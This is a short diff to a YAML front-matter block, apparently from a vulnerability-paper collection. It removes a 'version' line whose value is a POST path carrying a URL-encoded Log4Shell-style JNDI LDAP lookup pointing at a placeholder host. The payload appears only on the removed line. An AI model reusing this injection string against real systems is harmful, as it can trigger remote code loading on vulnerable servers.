@@ -1,5 +1,4 @@
 ---
-version: "POST: http://0.0.0.0:8081/jars/${jndi:ldap:%252f%252f0.0.0.0%252f123}.jar/run"
 source: "MrWQ/vulnerability-paper"
 ---
 
